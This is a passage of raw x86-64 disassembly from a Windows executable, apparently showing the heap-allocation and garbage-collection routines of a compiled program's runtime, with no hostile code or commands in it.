  4035f3:	49 81 fd ff ff ff 3e 	cmp    $0x3effffff,%r13
  4035fa:	7f 44                	jg     0x403640
  4035fc:	48 89 fa             	mov    %rdi,%rdx
  4035ff:	48 89 f1             	mov    %rsi,%rcx
  403602:	e8 5a fe ff ff       	call   0x403461
  403607:	48 8b 47 08          	mov    0x8(%rdi),%rax
  40360b:	4c 89 e2             	mov    %r12,%rdx
  40360e:	48 89 e9             	mov    %rbp,%rcx
  403611:	48 01 43 08          	add    %rax,0x8(%rbx)
  403615:	e8 0a fe ff ff       	call   0x403424
  40361a:	48 81 7b 08 00 00 00 	cmpq   $0x3f000000,0x8(%rbx)
  403621:	3f 
  403622:	7e 1c                	jle    0x403640
  403624:	48 89 da             	mov    %rbx,%rdx
  403627:	48 89 f1             	mov    %rsi,%rcx
  40362a:	41 b8 00 00 00 3f    	mov    $0x3f000000,%r8d
  403630:	e8 eb e3 ff ff       	call   0x401a20
  403635:	48 89 f1             	mov    %rsi,%rcx
  403638:	48 89 c2             	mov    %rax,%rdx
  40363b:	e8 02 e1 ff ff       	call   0x401742
  403640:	48 89 da             	mov    %rbx,%rdx
  403643:	48 89 f1             	mov    %rsi,%rcx
  403646:	48 83 c4 28          	add    $0x28,%rsp
  40364a:	5b                   	pop    %rbx
  40364b:	5e                   	pop    %rsi
  40364c:	5f                   	pop    %rdi
  40364d:	5d                   	pop    %rbp
  40364e:	41 5c                	pop    %r12
  403650:	41 5d                	pop    %r13
  403652:	e9 eb e0 ff ff       	jmp    0x401742
  403657:	48 83 ec 28          	sub    $0x28,%rsp
  40365b:	48 8b 15 4e 44 01 00 	mov    0x1444e(%rip),%rdx        # 0x417ab0
  403662:	48 8b 02             	mov    (%rdx),%rax
  403665:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
  40366b:	7f 16                	jg     0x403683
  40366d:	4c 8b 05 2c 44 01 00 	mov    0x1442c(%rip),%r8        # 0x417aa0
  403674:	49 89 0c c0          	mov    %rcx,(%r8,%rax,8)
  403678:	48 ff c0             	inc    %rax
  40367b:	48 89 02             	mov    %rax,(%rdx)
  40367e:	48 83 c4 28          	add    $0x28,%rsp
  403682:	c3                   	ret
  403683:	ff 15 b3 7d 03 00    	call   *0x37db3(%rip)        # 0x43b43c
  403689:	48 8d 15 f0 0d 01 00 	lea    0x10df0(%rip),%rdx        # 0x414480
  403690:	48 8d 48 60          	lea    0x60(%rax),%rcx
  403694:	e8 79 e1 ff ff       	call   0x401812
  403699:	b9 01 00 00 00       	mov    $0x1,%ecx
  40369e:	e8 65 7f 00 00       	call   0x40b608
  4036a3:	90                   	nop
  4036a4:	4c 8b 49 08          	mov    0x8(%rcx),%r9
  4036a8:	48 8b 49 18          	mov    0x18(%rcx),%rcx
  4036ac:	49 89 d0             	mov    %rdx,%r8
  4036af:	4d 21 c8             	and    %r9,%r8
  4036b2:	4a 8b 04 c1          	mov    (%rcx,%r8,8),%rax
  4036b6:	48 85 c0             	test   %rax,%rax
  4036b9:	74 12                	je     0x4036cd
  4036bb:	48 3b 50 08          	cmp    0x8(%rax),%rdx
  4036bf:	74 0c                	je     0x4036cd
  4036c1:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
  4036c5:	49 ff c0             	inc    %r8
  4036c8:	4d 21 c8             	and    %r9,%r8
  4036cb:	eb e5                	jmp    0x4036b2
  4036cd:	c3                   	ret
  4036ce:	48 8b 42 10          	mov    0x10(%rdx),%rax
  4036d2:	48 8b 00             	mov    (%rax),%rax
  4036d5:	48 83 f8 02          	cmp    $0x2,%rax
  4036d9:	74 27                	je     0x403702
  4036db:	7f 0f                	jg     0x4036ec
  4036dd:	48 ff c8             	dec    %rax
  4036e0:	75 33                	jne    0x403715
  4036e2:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4036e6:	0f b6 04 08          	movzbl (%rax,%rcx,1),%eax
  4036ea:	eb 2b                	jmp    0x403717
  4036ec:	48 83 f8 04          	cmp    $0x4,%rax
  4036f0:	74 1a                	je     0x40370c
  4036f2:	48 83 f8 08          	cmp    $0x8,%rax
  4036f6:	75 1d                	jne    0x403715
  4036f8:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4036fc:	48 8b 04 08          	mov    (%rax,%rcx,1),%rax
  403700:	eb 15                	jmp    0x403717
  403702:	48 8b 42 08          	mov    0x8(%rdx),%rax
  403706:	0f b7 04 08          	movzwl (%rax,%rcx,1),%eax
  40370a:	eb 0b                	jmp    0x403717
  40370c:	48 8b 42 08          	mov    0x8(%rdx),%rax
  403710:	8b 04 08             	mov    (%rax,%rcx,1),%eax
  403713:	eb 02                	jmp    0x403717
  403715:	31 c0                	xor    %eax,%eax
  403717:	48 8b 4a 20          	mov    0x20(%rdx),%rcx
  40371b:	48 8b 52 28          	mov    0x28(%rdx),%rdx
  40371f:	48 39 c1             	cmp    %rax,%rcx
  403722:	76 09                	jbe    0x40372d
  403724:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
  403728:	48 85 c0             	test   %rax,%rax
  40372b:	75 04                	jne    0x403731
  40372d:	48 8b 04 ca          	mov    (%rdx,%rcx,8),%rax
  403731:	c3                   	ret
  403732:	57                   	push   %rdi
  403733:	56                   	push   %rsi
  403734:	53                   	push   %rbx
  403735:	48 83 ec 20          	sub    $0x20,%rsp
  403739:	48 89 d3             	mov    %rdx,%rbx
  40373c:	48 89 ce             	mov    %rcx,%rsi
  40373f:	48 81 e3 00 f0 ff ff 	and    $0xfffffffffffff000,%rbx
  403746:	48 8b 43 08          	mov    0x8(%rbx),%rax
  40374a:	48 29 81 98 28 00 00 	sub    %rax,0x2898(%rcx)
  403751:	48 3d c8 0f 00 00    	cmp    $0xfc8,%rax
  403757:	0f 8f c2 00 00 00    	jg     0x40381f
  40375d:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
  403761:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
  403768:	00 
  403769:	48 89 0a             	mov    %rcx,(%rdx)
  40376c:	48 89 53 20          	mov    %rdx,0x20(%rbx)
  403770:	48 8b 53 28          	mov    0x28(%rbx),%rdx
  403774:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
  403778:	48 39 c2             	cmp    %rax,%rdx
  40377b:	7d 31                	jge    0x4037ae
  40377d:	48 99                	cqto
  40377f:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  403785:	49 f7 f8             	idiv   %r8
  403788:	48 8d 04 c6          	lea    (%rsi,%rax,8),%rax
  40378c:	48 8b 50 10          	mov    0x10(%rax),%rdx
  403790:	48 89 53 10          	mov    %rdx,0x10(%rbx)
  403794:	48 8b 50 10          	mov    0x10(%rax),%rdx
  403798:	48 85 d2             	test   %rdx,%rdx
  40379b:	74 04                	je     0x4037a1
  40379d:	48 89 5a 18          	mov    %rbx,0x18(%rdx)
  4037a1:	48 89 58 10          	mov    %rbx,0x10(%rax)
  4037a5:	48 89 4b 28          	mov    %rcx,0x28(%rbx)
  4037a9:	e9 12 01 00 00       	jmp    0x4038c0
  4037ae:	48 81 f9 c8 0f 00 00 	cmp    $0xfc8,%rcx
  4037b5:	48 89 4b 28          	mov    %rcx,0x28(%rbx)
  4037b9:	0f 85 01 01 00 00    	jne    0x4038c0
  4037bf:	48 99                	cqto
  4037c1:	b9 08 00 00 00       	mov    $0x8,%ecx
  4037c6:	48 f7 f9             	idiv   %rcx
  4037c9:	48 8d 14 c6          	lea    (%rsi,%rax,8),%rdx
  4037cd:	48 8b 43 10          	mov    0x10(%rbx),%rax
  4037d1:	48 3b 5a 10          	cmp    0x10(%rdx),%rbx
  4037d5:	75 13                	jne    0x4037ea
  4037d7:	48 85 c0             	test   %rax,%rax
  4037da:	48 89 42 10          	mov    %rax,0x10(%rdx)
  4037de:	74 1f                	je     0x4037ff
  4037e0:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
  4037e7:	00 
  4037e8:	eb 15                	jmp    0x4037ff
  4037ea:	48 8b 53 18          	mov    0x18(%rbx),%rdx
  4037ee:	48 89 42 10          	mov    %rax,0x10(%rdx)
  4037f2:	48 8b 43 10          	mov    0x10(%rbx),%rax
  4037f6:	48 85 c0             	test   %rax,%rax
  4037f9:	74 04                	je     0x4037ff
  4037fb:	48 89 50 18          	mov    %rdx,0x18(%rax)
  4037ff:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  403806:	00 
  403807:	48 89 da             	mov    %rbx,%rdx
  40380a:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
  403811:	00 
  403812:	48 c7 43 08 00 10 00 	movq   $0x1000,0x8(%rbx)
  403819:	00 
  40381a:	e9 92 00 00 00       	jmp    0x4038b1
  40381f:	48 83 b9 d8 30 00 00 	cmpq   $0x0,0x30d8(%rcx)
  403826:	00 
  403827:	48 8d 81 d8 30 00 00 	lea    0x30d8(%rcx),%rax
  40382e:	75 0e                	jne    0x40383e
  403830:	48 89 81 d8 30 00 00 	mov    %rax,0x30d8(%rcx)
  403837:	48 89 81 e0 30 00 00 	mov    %rax,0x30e0(%rcx)
  40383e:	48 89 86 b0 30 00 00 	mov    %rax,0x30b0(%rsi)
  403845:	48 8d 96 a8 30 00 00 	lea    0x30a8(%rsi),%rdx
  40384c:	48 89 f1             	mov    %rsi,%rcx
  40384f:	4c 8d 43 20          	lea    0x20(%rbx),%r8
  403853:	e8 8d fa ff ff       	call   0x4032e5
  403858:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
  40385c:	48 89 da             	mov    %rbx,%rdx
  40385f:	48 81 ff 00 00 00 3f 	cmp    $0x3f000000,%rdi
  403866:	7e 49                	jle    0x4038b1
  403868:	48 8d 8e a8 28 00 00 	lea    0x28a8(%rsi),%rcx
  40386f:	48 c1 fa 0c          	sar    $0xc,%rdx
  403873:	e8 ac fb ff ff       	call   0x403424
  403878:	48 8b 86 80 28 00 00 	mov    0x2880(%rsi),%rax
  40387f:	48 89 d9             	mov    %rbx,%rcx
  403882:	48 39 86 88 28 00 00 	cmp    %rax,0x2888(%rsi)
  403889:	48 89 c2             	mov    %rax,%rdx
  40388c:	48 0f 4d 96 88 28 00 	cmovge 0x2888(%rsi),%rdx
  403893:	00 
  403894:	48 29 f8             	sub    %rdi,%rax
  403897:	48 89 86 80 28 00 00 	mov    %rax,0x2880(%rsi)
  40389e:	48 89 96 88 28 00 00 	mov    %rdx,0x2888(%rsi)
  4038a5:	48 83 c4 20          	add    $0x20,%rsp
  4038a9:	5b                   	pop    %rbx
  4038aa:	5e                   	pop    %rsi
  4038ab:	5f                   	pop    %rdi
  4038ac:	e9 f9 40 00 00       	jmp    0x4079aa
  4038b1:	48 89 f1             	mov    %rsi,%rcx
  4038b4:	48 83 c4 20          	add    $0x20,%rsp
  4038b8:	5b                   	pop    %rbx
  4038b9:	5e                   	pop    %rsi
  4038ba:	5f                   	pop    %rdi
  4038bb:	e9 4f fc ff ff       	jmp    0x40350f
  4038c0:	48 83 c4 20          	add    $0x20,%rsp
  4038c4:	5b                   	pop    %rbx
  4038c5:	5e                   	pop    %rsi
  4038c6:	5f                   	pop    %rdi
  4038c7:	c3                   	ret
  4038c8:	48 83 ec 28          	sub    $0x28,%rsp
  4038cc:	e8 46 f2 ff ff       	call   0x402b17
  4038d1:	48 8d 48 38          	lea    0x38(%rax),%rcx
  4038d5:	48 83 c4 28          	add    $0x28,%rsp
  4038d9:	e9 d2 f9 ff ff       	jmp    0x4032b0
  4038de:	53                   	push   %rbx
  4038df:	48 83 ec 20          	sub    $0x20,%rsp
  4038e3:	48 89 cb             	mov    %rcx,%rbx
  4038e6:	e8 2c f2 ff ff       	call   0x402b17
  4038eb:	48 8d 53 f0          	lea    -0x10(%rbx),%rdx
  4038ef:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  4038f6:	48 83 c4 20          	add    $0x20,%rsp
  4038fa:	5b                   	pop    %rbx
  4038fb:	e9 32 fe ff ff       	jmp    0x403732
  403900:	41 54                	push   %r12
  403902:	55                   	push   %rbp
  403903:	57                   	push   %rdi
  403904:	56                   	push   %rsi
  403905:	53                   	push   %rbx
  403906:	48 83 ec 20          	sub    $0x20,%rsp
  40390a:	48 8b 69 08          	mov    0x8(%rcx),%rbp
  40390e:	48 89 cb             	mov    %rcx,%rbx
  403911:	48 8b 49 18          	mov    0x18(%rcx),%rcx
  403915:	48 89 d7             	mov    %rdx,%rdi
  403918:	48 89 d6             	mov    %rdx,%rsi
  40391b:	48 c1 ef 0c          	shr    $0xc,%rdi
  40391f:	48 89 ea             	mov    %rbp,%rdx
  403922:	48 21 fa             	and    %rdi,%rdx
  403925:	48 8b 04 d1          	mov    (%rcx,%rdx,8),%rax
  403929:	48 85 c0             	test   %rax,%rax
  40392c:	74 16                	je     0x403944
  40392e:	48 3b 78 08          	cmp    0x8(%rax),%rdi
  403932:	0f 84 d1 00 00 00    	je     0x403a09
  403938:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  40393c:	48 ff c2             	inc    %rdx
  40393f:	48 21 ea             	and    %rbp,%rdx
  403942:	eb e1                	jmp    0x403925
  403944:	48 8b 13             	mov    (%rbx),%rdx
  403947:	48 8d 45 01          	lea    0x1(%rbp),%rax
  40394b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40394f:	4c 8d 04 52          	lea    (%rdx,%rdx,2),%r8
  403953:	4c 39 c1             	cmp    %r8,%rcx
  403956:	7c 09                	jl     0x403961
  403958:	48 29 d0             	sub    %rdx,%rax
  40395b:	48 83 f8 03          	cmp    $0x3,%rax
  40395f:	7f 5b                	jg     0x4039bc
  403961:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
  403965:	48 c1 e1 03          	shl    $0x3,%rcx
  403969:	48 89 43 08          	mov    %rax,0x8(%rbx)
  40396d:	e8 d4 ec ff ff       	call   0x402646
  403972:	45 31 c0             	xor    %r8d,%r8d
  403975:	49 89 c4             	mov    %rax,%r12
  403978:	4c 39 c5             	cmp    %r8,%rbp
  40397b:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  40397f:	7c 32                	jl     0x4039b3
  403981:	4a 8b 0c c1          	mov    (%rcx,%r8,8),%rcx
  403985:	48 85 c9             	test   %rcx,%rcx
  403988:	74 24                	je     0x4039ae
  40398a:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
  40398e:	4c 89 ca             	mov    %r9,%rdx
  403991:	48 23 51 08          	and    0x8(%rcx),%rdx
  403995:	49 8d 04 d4          	lea    (%r12,%rdx,8),%rax
  403999:	48 83 38 00          	cmpq   $0x0,(%rax)
  40399d:	74 0c                	je     0x4039ab
  40399f:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  4039a3:	48 ff c2             	inc    %rdx
  4039a6:	4c 21 ca             	and    %r9,%rdx
  4039a9:	eb ea                	jmp    0x403995
  4039ab:	48 89 08             	mov    %rcx,(%rax)
  4039ae:	49 ff c0             	inc    %r8
  4039b1:	eb c5                	jmp    0x403978
  4039b3:	e8 26 ff ff ff       	call   0x4038de
  4039b8:	4c 89 63 18          	mov    %r12,0x18(%rbx)
  4039bc:	48 8b 53 08          	mov    0x8(%rbx),%rdx
  4039c0:	48 89 f8             	mov    %rdi,%rax
  4039c3:	48 ff 03             	incq   (%rbx)
  4039c6:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  4039ca:	48 21 d0             	and    %rdx,%rax
  4039cd:	48 83 3c c1 00       	cmpq   $0x0,(%rcx,%rax,8)
  4039d2:	48 8d 2c c5 00 00 00 	lea    0x0(,%rax,8),%rbp
  4039d9:	00 
  4039da:	74 0c                	je     0x4039e8
  4039dc:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  4039e0:	48 ff c0             	inc    %rax
  4039e3:	48 21 d0             	and    %rdx,%rax
  4039e6:	eb e5                	jmp    0x4039cd
  4039e8:	b9 50 00 00 00       	mov    $0x50,%ecx
  4039ed:	e8 54 ec ff ff       	call   0x402646
  4039f2:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  4039f6:	48 89 78 08          	mov    %rdi,0x8(%rax)
  4039fa:	48 89 10             	mov    %rdx,(%rax)
  4039fd:	48 8b 53 18          	mov    0x18(%rbx),%rdx
  403a01:	48 89 43 10          	mov    %rax,0x10(%rbx)
  403a05:	48 89 04 2a          	mov    %rax,(%rdx,%rbp,1)
  403a09:	48 c1 ee 03          	shr    $0x3,%rsi
  403a0d:	ba 01 00 00 00       	mov    $0x1,%edx
  403a12:	48 89 f1             	mov    %rsi,%rcx
  403a15:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  403a1b:	49 89 c8             	mov    %rcx,%r8
  403a1e:	48 d3 e2             	shl    %cl,%rdx
  403a21:	49 c1 e8 06          	shr    $0x6,%r8
  403a25:	4a 09 54 c0 10       	or     %rdx,0x10(%rax,%r8,8)
  403a2a:	48 83 c4 20          	add    $0x20,%rsp
  403a2e:	5b                   	pop    %rbx
  403a2f:	5e                   	pop    %rsi
  403a30:	5f                   	pop    %rdi
  403a31:	5d                   	pop    %rbp
  403a32:	41 5c                	pop    %r12
  403a34:	c3                   	ret
  403a35:	41 54                	push   %r12
  403a37:	55                   	push   %rbp
  403a38:	57                   	push   %rdi
  403a39:	56                   	push   %rsi
  403a3a:	53                   	push   %rbx
  403a3b:	48 83 ec 20          	sub    $0x20,%rsp
  403a3f:	48 8b 41 08          	mov    0x8(%rcx),%rax
  403a43:	48 3b 01             	cmp    (%rcx),%rax
  403a46:	48 89 cb             	mov    %rcx,%rbx
  403a49:	49 89 d4             	mov    %rdx,%r12
  403a4c:	7f 52                	jg     0x403aa0
  403a4e:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  403a52:	b9 02 00 00 00       	mov    $0x2,%ecx
  403a57:	48 99                	cqto
  403a59:	48 f7 f9             	idiv   %rcx
  403a5c:	48 89 43 08          	mov    %rax,0x8(%rbx)
  403a60:	48 89 c6             	mov    %rax,%rsi
  403a63:	e8 af f0 ff ff       	call   0x402b17
  403a68:	48 8d 14 f5 00 00 00 	lea    0x0(,%rsi,8),%rdx
  403a6f:	00 
  403a70:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  403a77:	e8 95 e5 ff ff       	call   0x402011
  403a7c:	48 8b 73 10          	mov    0x10(%rbx),%rsi
  403a80:	48 89 c5             	mov    %rax,%rbp
  403a83:	48 8b 03             	mov    (%rbx),%rax
  403a86:	48 89 ef             	mov    %rbp,%rdi
  403a89:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
  403a90:	00 
  403a91:	f3 a4                	rep movsb (%rsi),(%rdi)
  403a93:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
  403a97:	e8 42 fe ff ff       	call   0x4038de
  403a9c:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
  403aa0:	48 8b 03             	mov    (%rbx),%rax
  403aa3:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  403aa7:	4c 89 24 c2          	mov    %r12,(%rdx,%rax,8)
  403aab:	48 ff c0             	inc    %rax
  403aae:	48 89 03             	mov    %rax,(%rbx)
  403ab1:	48 83 c4 20          	add    $0x20,%rsp
  403ab5:	5b                   	pop    %rbx
  403ab6:	5e                   	pop    %rsi
  403ab7:	5f                   	pop    %rdi
  403ab8:	5d                   	pop    %rbp
  403ab9:	41 5c                	pop    %r12
  403abb:	c3                   	ret
  403abc:	56                   	push   %rsi
  403abd:	53                   	push   %rbx
  403abe:	48 83 ec 28          	sub    $0x28,%rsp
  403ac2:	48 8d 5a f0          	lea    -0x10(%rdx),%rbx
  403ac6:	48 89 ce             	mov    %rcx,%rsi
  403ac9:	48 81 fb 00 10 00 00 	cmp    $0x1000,%rbx
  403ad0:	0f 86 b9 00 00 00    	jbe    0x403b8f
  403ad6:	48 8d 89 10 29 00 00 	lea    0x2910(%rcx),%rcx
  403add:	48 89 da             	mov    %rbx,%rdx
  403ae0:	48 c1 fa 0c          	sar    $0xc,%rdx
  403ae4:	e8 f0 dc ff ff       	call   0x4017d9
  403ae9:	84 c0                	test   %al,%al
  403aeb:	74 52                	je     0x403b3f
  403aed:	48 89 d9             	mov    %rbx,%rcx
  403af0:	48 81 e1 00 f0 ff ff 	and    $0xfffffffffffff000,%rcx
  403af7:	f6 01 01             	testb  $0x1,(%rcx)
  403afa:	0f 84 8f 00 00 00    	je     0x403b8f
  403b00:	4c 8b 49 08          	mov    0x8(%rcx),%r9
  403b04:	49 81 f9 c8 0f 00 00 	cmp    $0xfc8,%r9
  403b0b:	7f 22                	jg     0x403b2f
  403b0d:	81 e3 ff 0f 00 00    	and    $0xfff,%ebx
  403b13:	48 8d 43 c8          	lea    -0x38(%rbx),%rax
  403b17:	48 3b 41 30          	cmp    0x30(%rcx),%rax
  403b1b:	73 72                	jae    0x403b8f
  403b1d:	4c 8d 44 01 38       	lea    0x38(%rcx,%rax,1),%r8
  403b22:	31 d2                	xor    %edx,%edx
  403b24:	49 f7 f1             	div    %r9
  403b27:	49 29 d0             	sub    %rdx,%r8
  403b2a:	4c 89 c2             	mov    %r8,%rdx
  403b2d:	eb 46                	jmp    0x403b75
  403b2f:	48 8d 51 20          	lea    0x20(%rcx),%rdx
  403b33:	48 39 da             	cmp    %rbx,%rdx
  403b36:	77 57                	ja     0x403b8f
  403b38:	48 83 79 28 01       	cmpq   $0x1,0x28(%rcx)
  403b3d:	eb 3b                	jmp    0x403b7a
  403b3f:	48 3b 5e 68          	cmp    0x68(%rsi),%rbx
  403b43:	72 4a                	jb     0x403b8f
  403b45:	48 3b 5e 70          	cmp    0x70(%rsi),%rbx
  403b49:	77 44                	ja     0x403b8f
  403b4b:	48 8b 86 10 31 00 00 	mov    0x3110(%rsi),%rax
  403b52:	48 3b 00             	cmp    (%rax),%rax
  403b55:	74 38                	je     0x403b8f
  403b57:	48 8b 50 10          	mov    0x10(%rax),%rdx
  403b5b:	48 39 d3             	cmp    %rdx,%rbx
  403b5e:	72 06                	jb     0x403b66
  403b60:	48 3b 58 18          	cmp    0x18(%rax),%rbx
  403b64:	72 0f                	jb     0x403b75
  403b66:	48 39 d3             	cmp    %rdx,%rbx
  403b69:	0f 97 c2             	seta   %dl
  403b6c:	0f b6 d2             	movzbl %dl,%edx
  403b6f:	48 8b 04 d0          	mov    (%rax,%rdx,8),%rax
  403b73:	eb dd                	jmp    0x403b52
  403b75:	48 83 7a 08 01       	cmpq   $0x1,0x8(%rdx)
  403b7a:	76 13                	jbe    0x403b8f
  403b7c:	48 83 02 08          	addq   $0x8,(%rdx)
  403b80:	48 8d 4e 30          	lea    0x30(%rsi),%rcx
  403b84:	48 83 c4 28          	add    $0x28,%rsp
  403b88:	5b                   	pop    %rbx
  403b89:	5e                   	pop    %rsi
  403b8a:	e9 a6 fe ff ff       	jmp    0x403a35
  403b8f:	48 83 c4 28          	add    $0x28,%rsp
  403b93:	5b                   	pop    %rbx
  403b94:	5e                   	pop    %rsi
  403b95:	c3                   	ret
  403b96:	48 8b 02             	mov    (%rdx),%rax
  403b99:	a8 04                	test   $0x4,%al
  403b9b:	75 0c                	jne    0x403ba9
  403b9d:	48 83 c8 04          	or     $0x4,%rax
  403ba1:	48 89 02             	mov    %rax,(%rdx)
  403ba4:	e9 8c fe ff ff       	jmp    0x403a35
  403ba9:	c3                   	ret
  403baa:	53                   	push   %rbx
  403bab:	48 83 ec 20          	sub    $0x20,%rsp
  403baf:	e8 63 ef ff ff       	call   0x402b17
  403bb4:	b9 00 20 00 00       	mov    $0x2000,%ecx
  403bb9:	48 c7 40 40 00 00 40 	movq   $0x400000,0x40(%rax)
  403bc0:	00 
  403bc1:	48 89 c3             	mov    %rax,%rbx
  403bc4:	48 c7 40 48 f4 01 00 	movq   $0x1f4,0x48(%rax)
  403bcb:	00 
  403bcc:	48 c7 80 90 33 00 00 	movq   $0x0,0x3390(%rax)
  403bd3:	00 00 00 00 
  403bd7:	48 c7 80 98 33 00 00 	movq   $0x0,0x3398(%rax)
  403bde:	00 00 00 00 
  403be2:	48 c7 80 a0 33 00 00 	movq   $0x0,0x33a0(%rax)
  403be9:	00 00 00 00 
  403bed:	48 c7 80 a8 33 00 00 	movq   $0x0,0x33a8(%rax)
  403bf4:	00 00 00 00 
  403bf8:	48 c7 80 b0 33 00 00 	movq   $0x0,0x33b0(%rax)
  403bff:	00 00 00 00 
  403c03:	48 c7 80 b8 33 00 00 	movq   $0x0,0x33b8(%rax)
  403c0a:	00 00 00 00 
  403c0e:	48 c7 40 50 00 00 00 	movq   $0x0,0x50(%rax)
  403c15:	00 
  403c16:	48 c7 40 58 00 04 00 	movq   $0x400,0x58(%rax)
  403c1d:	00 
  403c1e:	e8 23 ea ff ff       	call   0x402646
  403c23:	b9 00 20 00 00       	mov    $0x2000,%ecx
  403c28:	48 c7 83 80 00 00 00 	movq   $0x0,0x80(%rbx)
  403c2f:	00 00 00 00 
  403c33:	48 89 43 60          	mov    %rax,0x60(%rbx)
  403c37:	48 c7 83 88 00 00 00 	movq   $0x400,0x88(%rbx)
  403c3e:	00 04 00 00 
  403c42:	e8 ff e9 ff ff       	call   0x402646
  403c47:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
  403c4e:	00 
  403c4f:	b9 00 20 00 00       	mov    $0x2000,%ecx
  403c54:	48 89 83 90 00 00 00 	mov    %rax,0x90(%rbx)
  403c5b:	48 c7 43 70 00 04 00 	movq   $0x400,0x70(%rbx)
  403c62:	00 
  403c63:	e8 de e9 ff ff       	call   0x402646
  403c68:	b9 00 20 00 00       	mov    $0x2000,%ecx
  403c6d:	48 89 43 78          	mov    %rax,0x78(%rbx)
  403c71:	e8 d0 e9 ff ff       	call   0x402646
  403c76:	b9 00 20 00 00       	mov    $0x2000,%ecx
  403c7b:	48 c7 83 d0 33 00 00 	movq   $0x3ff,0x33d0(%rbx)
  403c82:	ff 03 00 00 
  403c86:	48 89 83 e0 33 00 00 	mov    %rax,0x33e0(%rbx)
  403c8d:	48 c7 83 c8 33 00 00 	movq   $0x0,0x33c8(%rbx)
  403c94:	00 00 00 00 
  403c98:	48 c7 83 d8 33 00 00 	movq   $0x0,0x33d8(%rbx)
  403c9f:	00 00 00 00 
  403ca3:	48 c7 83 e8 33 00 00 	movq   $0x0,0x33e8(%rbx)
  403caa:	00 00 00 00 
  403cae:	48 c7 83 f0 33 00 00 	movq   $0x400,0x33f0(%rbx)
  403cb5:	00 04 00 00 
  403cb9:	e8 88 e9 ff ff       	call   0x402646
  403cbe:	48 8d 8b 10 34 00 00 	lea    0x3410(%rbx),%rcx
  403cc5:	48 89 83 f8 33 00 00 	mov    %rax,0x33f8(%rbx)
  403ccc:	ff 15 92 76 03 00    	call   *0x37692(%rip)        # 0x43b364
  403cd2:	b8 01 00 00 00       	mov    $0x1,%eax
  403cd7:	48 c7 83 00 34 00 00 	movq   $0x0,0x3400(%rbx)
  403cde:	00 00 00 00 
  403ce2:	48 c7 83 08 34 00 00 	movq   $0x0,0x3408(%rbx)
  403ce9:	00 00 00 00 
  403ced:	f0 48 0f c1 05 8a c8 	lock xadd %rax,0x1c88a(%rip)        # 0x420580
  403cf4:	01 00 
  403cf6:	48 89 83 38 34 00 00 	mov    %rax,0x3438(%rbx)
  403cfd:	48 83 c4 20          	add    $0x20,%rsp
  403d01:	5b                   	pop    %rbx
  403d02:	c3                   	ret
  403d03:	53                   	push   %rbx
  403d04:	48 83 ec 20          	sub    $0x20,%rsp
  403d08:	48 8b 01             	mov    (%rcx),%rax
  403d0b:	48 83 e8 08          	sub    $0x8,%rax
  403d0f:	48 89 cb             	mov    %rcx,%rbx
  403d12:	48 83 f8 07          	cmp    $0x7,%rax
  403d16:	48 89 01             	mov    %rax,(%rcx)
  403d19:	77 16                	ja     0x403d31
  403d1b:	e8 f7 ed ff ff       	call   0x402b17
  403d20:	48 89 da             	mov    %rbx,%rdx
  403d23:	48 8d 48 50          	lea    0x50(%rax),%rcx
  403d27:	48 83 c4 20          	add    $0x20,%rsp
  403d2b:	5b                   	pop    %rbx
  403d2c:	e9 65 fe ff ff       	jmp    0x403b96
  403d31:	48 83 c4 20          	add    $0x20,%rsp
  403d35:	5b                   	pop    %rbx
  403d36:	c3                   	ret
  403d37:	56                   	push   %rsi
  403d38:	53                   	push   %rbx
  403d39:	48 83 ec 28          	sub    $0x28,%rsp
  403d3d:	48 89 cb             	mov    %rcx,%rbx
  403d40:	89 d6                	mov    %edx,%esi
  403d42:	e8 d0 ed ff ff       	call   0x402b17
  403d47:	48 85 db             	test   %rbx,%rbx
  403d4a:	74 46                	je     0x403d92
  403d4c:	48 8d 53 f0          	lea    -0x10(%rbx),%rdx
  403d50:	40 80 fe 01          	cmp    $0x1,%sil
  403d54:	74 2a                	je     0x403d80
  403d56:	72 19                	jb     0x403d71
  403d58:	40 80 fe 02          	cmp    $0x2,%sil
  403d5c:	74 08                	je     0x403d66
  403d5e:	40 80 fe 03          	cmp    $0x3,%sil
  403d62:	74 1c                	je     0x403d80
  403d64:	eb 2c                	jmp    0x403d92
  403d66:	48 89 d1             	mov    %rdx,%rcx
  403d69:	48 83 c4 28          	add    $0x28,%rsp
  403d6d:	5b                   	pop    %rbx
  403d6e:	5e                   	pop    %rsi
  403d6f:	eb 92                	jmp    0x403d03
  403d71:	48 8d 48 38          	lea    0x38(%rax),%rcx
  403d75:	48 83 c4 28          	add    $0x28,%rsp
  403d79:	5b                   	pop    %rbx
  403d7a:	5e                   	pop    %rsi
  403d7b:	e9 fc 02 00 00       	jmp    0x40407c
  403d80:	48 8d 88 80 00 00 00 	lea    0x80(%rax),%rcx
  403d87:	48 83 c4 28          	add    $0x28,%rsp
  403d8b:	5b                   	pop    %rbx
  403d8c:	5e                   	pop    %rsi
